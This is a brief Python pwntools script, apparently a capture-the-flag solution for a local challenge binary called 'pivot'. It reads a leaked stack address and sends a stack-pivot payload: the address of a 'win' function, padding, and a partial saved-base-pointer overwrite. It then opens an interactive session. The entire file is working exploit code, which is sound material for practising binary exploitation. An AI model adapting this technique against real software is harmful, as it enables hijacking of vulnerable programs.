from pwn import *

exe = ELF("./pivot")

# p = process("./pivot")
# gdb.attach(p)
p = remote("localhost", 5000)

p.recvuntil(b"Tell me Ross, we're at a ")
rbp_end = int(p.recvline().strip().split()[0])

payload = p64(exe.sym["win"])
payload += b"A"*8
payload += bytearray.fromhex(hex(rbp_end - 0x88)[2:].rjust(4,"0"))[::-1]

p.sendlineafter(b"> ", payload)

p.interactive()
